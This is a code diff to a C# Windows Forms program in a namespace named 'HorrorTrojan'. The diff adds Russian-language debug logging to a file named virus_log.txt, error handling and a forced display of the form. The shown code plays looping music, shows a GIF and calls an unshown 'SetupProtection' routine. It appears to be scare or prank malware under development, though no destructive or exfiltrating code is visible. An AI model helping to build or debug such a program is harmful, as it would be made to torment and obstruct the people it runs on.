@@ -45,10 +45,17 @@ namespace HorrorTrojan
         private SoundPlayer musicPlayer;
         private Image gifImage;
 
+        private string logPath = @"C:\Windows\Temp\virus_log.txt";
+        private void Log(string msg) { try { File.AppendAllText(logPath, $"{DateTime.Now:HH:mm:ss} - [FORM] {msg}\n"); } catch { } }
+
         public MainInterface()
         {
+            Log("Конструктор формы");
             InitializeComponent();
+            Log("InitializeComponent выполнен");
             this.Load += MainInterface_Load;
+            Log("Подписан Load");
+            this.Shown += (s, e) => { Log("Форма показана"); };
         }
 
         private void InitializeComponent()
@@ -92,14 +99,38 @@ namespace HorrorTrojan
 
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).EndInit();
             this.ResumeLayout(false);
+
+            Log("InitializeComponent завершён");
         }
 
         private void MainInterface_Load(object sender, EventArgs e)
         {
-            LoadResources();
-            StartTimers();
-            SetupProtection();
-            PlayMusic();
+            Log("=== LOAD ===");
+            try
+            {
+                Log("Загрузка ресурсов...");
+                LoadResources();
+                Log("Ресурсы загружены");
+                Log("Запуск таймеров...");
+                StartTimers();
+                Log("Таймеры запущены");
+                Log("Защита...");
+                SetupProtection();
+                Log("Защита включена");
+                Log("Музыка...");
+                PlayMusic();
+                Log("Музыка запущена");
+
+                Log("Принудительный показ формы");
+                this.Show();
+                this.BringToFront();
+                Log("Форма показана");
+            }
+            catch (Exception ex)
+            {
+                Log($"ОШИБКА В LOAD: {ex.Message}\n{ex.StackTrace}");
+                MessageBox.Show($"Ошибка в Load: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
 
         private void LoadResources()
@@ -107,15 +138,22 @@ namespace HorrorTrojan
             try
             {
                 string gifPath = Path.Combine(appDataPath, "hr.gif");
+                Log($"Поиск GIF: {gifPath}");
                 if (File.Exists(gifPath))
                 {
                     gifImage = Image.FromFile(gifPath);
                     this.pictureBox.Image = gifImage;
                     this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
                     ImageAnimator.Animate(gifImage, (s, ev) => { this.pictureBox.Invalidate(); });
+                    Log("GIF загружен");
+                }
+                else
+                {
+                    Log("GIF НЕ НАЙДЕН, заливка красным");
+                    this.pictureBox.BackColor = Color.Red;
                 }
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка LoadResources: {ex.Message}"); }
         }
 
         private void PlayMusic()
@@ -123,13 +161,19 @@ namespace HorrorTrojan
             try
             {
                 string musicPath = Path.Combine(appDataPath, "dv.mp3");
+                Log($"Поиск музыки: {musicPath}");
                 if (File.Exists(musicPath))
                 {
                     musicPlayer = new SoundPlayer(musicPath);
                     musicPlayer.PlayLooping();
+                    Log("Музыка играет");
+                }
+                else
+                {
+                    Log("Музыка НЕ НАЙДЕНА");
                 }
             }
-            catch { }
+            catch (Exception ex) { Log($"Ошибка PlayMusic: {ex.Message}"); }
         }
 
         private void StartTimers()
@@ -145,6 +189,7 @@ namespace HorrorTrojan
             videoTimer.Interval = rnd.Next(50000, 120000);
             videoTimer.Tick += VideoTimer_Tick;
             videoTimer.Start();
+            Log("Таймеры запущены");
         }
 
         private void MainTimer_Tick(object sender, EventArgs e)
